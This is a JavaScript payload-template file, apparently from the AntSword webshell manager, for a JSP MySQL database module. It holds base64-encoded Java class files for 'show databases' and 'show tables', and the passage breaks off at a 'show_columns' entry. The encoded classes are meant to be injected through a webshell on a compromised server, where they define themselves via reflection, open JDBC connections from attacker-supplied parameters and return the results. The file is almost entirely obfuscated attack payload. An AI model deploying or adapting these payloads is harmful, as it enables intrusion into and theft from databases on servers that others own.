//
// 默认代码模板
//
// @params
// :encode  SHELL编码
// :conn    数据库连接字符串
// :sql     执行SQL语句
// :db      数据库名
// :table   表名

module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
  show_databases: {
    _: 'yv66vgAAADEBNQoASACDCQBlAIQJAGUAhQgAhgkAZQCHCACICQBlAIkIAIoJAGUAiwoAZQCMBwCNCgALAIMIAI4IAI8IAJAIAJEIAJIIAJMLAEMAlAsAQgCVCwBDAJULAEIAlgoAZQCXCQBlAJgKAGUAmQoACwCaBwCbBwCcCgAcAIMIAJ0KABwAngoAGwCfCgAcAJ8LAEMAoAoACwCfCgBlAKEKAKIAowoApAClCgApAKYKACkApwcAqAoAZQCpCgApAKoIAKsKACkArAgArQgArgoAKQCvCgApALAKAEYAsQgAsgoAswC0CwC1ALYLALcAuAsAuQC6CwC7ALwLALsAvQsAuQC+CwC5AL8IAMAIAMEKAGUAwgoASADDCgBGAMQHAMUHAMYHAMcIAMgIAMkHAMoKAEYAywcAzAoAzQDOCADPCABmCgBGANAKANEA0goA0QDTCABoBwDUCADVBwDWCQCkANcKAM0A0goARgDYCgCkANkKAEYA2goA2wDcCgBIAJ8IAN0KAN4A3wgA4AoAKQDhCADiCADjCgBGAOQIAHUIAOUIAOYKAEYA5wcA6AEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdlbmNvZGVyAQASTGphdmEvbGFuZy9TdHJpbmc7AQACY3MBAAxyYW5kb21QcmVmaXgBABBkZWNvZGVyQ2xhc3NkYXRhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEABmRlY29kZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAKRXhjZXB0aW9ucwEACmV4ZWN1dGVTUUwBAG8oTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7WilMamF2YS9sYW5nL1N0cmluZzsBAA1zaG93RGF0YWJhc2VzAQA4KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAhwYXJzZU9iagEAFShMamF2YS9sYW5nL09iamVjdDspVgEACGFzb3V0cHV0AQASQmFzZTY0RGVjb2RlVG9CeXRlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAClNvdXJjZUZpbGUBABNTaG93X2RhdGFiYXNlcy5qYXZhDABvAHAMAGYAZwwAaABpAQAGYmFzZTY0DABqAGsBAA9hbnRzd29yZENoYXJzZXQMAGwAawEAFGFudHN3b3JkcmFuZG9tUHJlZml4DABtAGsMAHwAfQEAFmphdmEvbGFuZy9TdHJpbmdCdWZmZXIBAAMtPnwBAAN8PC0BABFhbnRzd29yZGFyZ2VuY29kZQEAD2FudHN3b3JkYXJnY29ubgEAEmFudHN3b3JkYXJnZGVjb2RlcgEACXRleHQvaHRtbAwA6QDqDADrAOoMAOwAdgwAdQB2DABuAGsMAHoAewwA7QDuAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAJRVJST1I6Ly8gDADtAO8MAPAA8QwA8gDzDAB+AHYHAPQMAPUA6gcA9gwA9wD4DAD5APoMAHMAdAEAEGphdmEvbGFuZy9TdHJpbmcMAH8AgAwAbwD7AQAADAD8APEBAAINCgEAAQoMAP0A/gwA/wEADAEBAQIBABMmY2hhcmFjdGVyRW5jb2Rpbmc9BwEDDAEEAQUHAQYMAQcBCAcBCQwBCgELBwEMDAENAQ4HAQ8MARABEQwBEgD6DAETARQMARUA+gEADnNob3cgZGF0YWJhc2VzAQABCQwAeAB5DAEWARcMARgBFAEAE1tMamF2YS9sYW5nL09iamVjdDsBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAB1qYXZheC5zZXJ2bGV0LmpzcC5QYWdlQ29udGV4dAEACmdldFJlcXVlc3QBAA9qYXZhL2xhbmcvQ2xhc3MMARkBGgEAEGphdmEvbGFuZy9PYmplY3QHARsMARwBHQEAC2dldFJlc3BvbnNlDAEeAR8HASAMASEBIgwBIwEkAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQALZGVmaW5lQ2xhc3MBAAJbQgwBJQEmDAEnASgMASkBKgwBKwEsBwEtDAEuAS8BAAxqYXZhLnZlcnNpb24HATAMATEAdgEAAzEuOQwBMgD4AQAQamF2YS51dGlsLkJhc2U2NAEACmdldERlY29kZXIMATMBGgEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIBAAxkZWNvZGVCdWZmZXIMAS4BNAEAHWRhdGFiYXNlL215c3FsL1Nob3dfZGF0YWJhc2VzAQAOc2V0Q29udGVudFR5cGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABRzZXRDaGFyYWN0ZXJFbmNvZGluZwEADGdldFBhcmFtZXRlcgEABmFwcGVuZAEALChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7AQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXByaW50AQARamF2YS9sYW5nL0ludGVnZXIBAAhwYXJzZUludAEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACXN1YnN0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAEdHJpbQEAB3JlcGxhY2UBAEQoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KUxqYXZhL2xhbmcvU3RyaW5nOwEABXNwbGl0AQAnKExqYXZhL2xhbmcvU3RyaW5nOylbTGphdmEvbGFuZy9TdHJpbmc7AQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBABZqYXZhL3NxbC9Ecml2ZXJNYW5hZ2VyAQANZ2V0Q29ubmVjdGlvbgEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc3FsL0Nvbm5lY3Rpb247AQATamF2YS9zcWwvQ29ubmVjdGlvbgEAD2NyZWF0ZVN0YXRlbWVudAEAFigpTGphdmEvc3FsL1N0YXRlbWVudDsBABJqYXZhL3NxbC9TdGF0ZW1lbnQBAAxleGVjdXRlUXVlcnkBACgoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NxbC9SZXN1bHRTZXQ7AQASamF2YS9zcWwvUmVzdWx0U2V0AQALZ2V0TWV0YURhdGEBAB4oKUxqYXZhL3NxbC9SZXN1bHRTZXRNZXRhRGF0YTsBABpqYXZhL3NxbC9SZXN1bHRTZXRNZXRhRGF0YQEADmdldENvbHVtbkNvdW50AQADKClJAQANZ2V0Q29sdW1uTmFtZQEABG5leHQBAAMoKVoBAAlnZXRTdHJpbmcBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAdpc0FycmF5AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAOZ2V0Q29uc3RydWN0b3IBADMoW0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsBAB1qYXZhL2xhbmcvcmVmbGVjdC9D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',
    [arg1]: '#{newbase64::encode}',
    [arg2]: '#{newbase64::conn}'
  },
  show_tables: {
    _: 'yv66vgAAADEBOQoASgCFCQBnAIYJAGcAhwgAiAkAZwCJCACKCQBnAIsIAIwJAGcAjQoAZwCOBwCPCgALAIUIAJAIAJEIAJIIAJMIAJQIAJUIAJYLAEUAlwsARACYCwBFAJgLAEQAmQoAZwCaCQBnAJsKAGcAnAoACwCdBwCeBwCfCgAdAIUIAKAKAB0AoQoAHACiCgAdAKILAEUAowoACwCiCgBnAKQKAKUApgoApwCoCgAqAKkKACoAqgcAqwoAZwCsCgAqAK0IAK4KACoArwgAsAgAsQoAKgCyCgAqALMKAEgAtAgAtQoAtgC3CwC4ALkLALoAuwsAvAC9CwC+AL8LAL4AwAsAvADBCwC8AMIIAMMIAMQIAMUKAGcAxgoASgDHCgBIAMgHAMkHAMoHAMsIAMwIAM0HAM4KAEgAzwcA0AoA0QDSCADTCABoCgBIANQKANUA1goA1QDXCABqBwDYCADZBwDaCQCnANsKANEA1goASADcCgCnAN0KAEgA3goA3wDgCgBKAKIIAOEKAOIA4wgA5AoAKgDlCADmCADnCgBIAOgIAHcIAOkIAOoKAEgA6wcA7AEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdlbmNvZGVyAQASTGphdmEvbGFuZy9TdHJpbmc7AQACY3MBAAxyYW5kb21QcmVmaXgBABBkZWNvZGVyQ2xhc3NkYXRhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEABmRlY29kZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAKRXhjZXB0aW9ucwEACmV4ZWN1dGVTUUwBAG8oTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7WilMamF2YS9sYW5nL1N0cmluZzsBAApzaG93VGFibGVzAQBKKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAhwYXJzZU9iagEAFShMamF2YS9sYW5nL09iamVjdDspVgEACGFzb3V0cHV0AQASQmFzZTY0RGVjb2RlVG9CeXRlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAClNvdXJjZUZpbGUBABBTaG93X3RhYmxlcy5qYXZhDABxAHIMAGgAaQwAagBrAQAGYmFzZTY0DABsAG0BAA9hbnRzd29yZENoYXJzZXQMAG4AbQEAFGFudHN3b3JkcmFuZG9tUHJlZml4DABvAG0MAH4AfwEAFmphdmEvbGFuZy9TdHJpbmdCdWZmZXIBAAMtPnwBAAN8PC0BABFhbnRzd29yZGFyZ2VuY29kZQEAD2FudHN3b3JkYXJnY29ubgEADWFudHN3b3JkYXJnZGIBABJhbnRzd29yZGFyZ2RlY29kZXIBAAl0ZXh0L2h0bWwMAO0A7gwA7wDuDADwAHgMAHcAeAwAcABtDAB8AH0MAPEA8gEAE2phdmEvbGFuZy9FeGNlcHRpb24BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACUVSUk9SOi8vIAwA8QDzDAD0APUMAPYA9wwAgAB4BwD4DAD5AO4HAPoMAPsA/AwA/QD+DAB1AHYBABBqYXZhL2xhbmcvU3RyaW5nDACBAIIMAHEA/wEAAAwBAAD1AQACDQoBAAEKDAEBAQIMAQMBBAwBBQEGAQATJmNoYXJhY3RlckVuY29kaW5nPQcBBwwBCAEJBwEKDAELAQwHAQ0MAQ4BDwcBEAwBEQESBwETDAEUARUMARYA/gwBFwEYDAEZAP4BABJzaG93IHRhYmxlcyBmcm9tIGABAAFgAQABCQwAegB7DAEaARsMARwBGAEAE1tMamF2YS9sYW5nL09iamVjdDsBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAB1qYXZheC5zZXJ2bGV0LmpzcC5QYWdlQ29udGV4dAEACmdldFJlcXVlc3QBAA9qYXZhL2xhbmcvQ2xhc3MMAR0BHgEAEGphdmEvbGFuZy9PYmplY3QHAR8MASABIQEAC2dldFJlc3BvbnNlDAEiASMHASQMASUBJgwBJwEoAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQALZGVmaW5lQ2xhc3MBAAJbQgwBKQEqDAErASwMAS0BLgwBLwEwBwExDAEyATMBAAxqYXZhLnZlcnNpb24HATQMATUAeAEAAzEuOQwBNgD8AQAQamF2YS51dGlsLkJhc2U2NAEACmdldERlY29kZXIMATcBHgEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIBAAxkZWNvZGVCdWZmZXIMATIBOAEAGmRhdGFiYXNlL215c3FsL1Nob3dfdGFibGVzAQAOc2V0Q29udGVudFR5cGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABRzZXRDaGFyYWN0ZXJFbmNvZGluZwEADGdldFBhcmFtZXRlcgEABmFwcGVuZAEALChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7AQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXByaW50AQARamF2YS9sYW5nL0ludGVnZXIBAAhwYXJzZUludAEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACXN1YnN0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAEdHJpbQEAB3JlcGxhY2UBAEQoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KUxqYXZhL2xhbmcvU3RyaW5nOwEABXNwbGl0AQAnKExqYXZhL2xhbmcvU3RyaW5nOylbTGphdmEvbGFuZy9TdHJpbmc7AQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBABZqYXZhL3NxbC9Ecml2ZXJNYW5hZ2VyAQANZ2V0Q29ubmVjdGlvbgEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc3FsL0Nvbm5lY3Rpb247AQATamF2YS9zcWwvQ29ubmVjdGlvbgEAD2NyZWF0ZVN0YXRlbWVudAEAFigpTGphdmEvc3FsL1N0YXRlbWVudDsBABJqYXZhL3NxbC9TdGF0ZW1lbnQBAAxleGVjdXRlUXVlcnkBACgoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NxbC9SZXN1bHRTZXQ7AQASamF2YS9zcWwvUmVzdWx0U2V0AQALZ2V0TWV0YURhdGEBAB4oKUxqYXZhL3NxbC9SZXN1bHRTZXRNZXRhRGF0YTsBABpqYXZhL3NxbC9SZXN1bHRTZXRNZXRhRGF0YQEADmdldENvbHVtbkNvdW50AQADKClJAQANZ2V0Q29sdW1uTmFtZQEABG5leHQBAAMoKVoBAAlnZXRTdHJpbmcBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAdpc0FycmF5AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAOZ2V0Q29uc3RydWN0b3IBADMoW0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVm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',
    [arg1]: '#{newbase64::encode}',
    [arg2]: '#{newbase64::conn}',
    [arg3]: '#{newbase64::db}'
  },
  show_columns: {
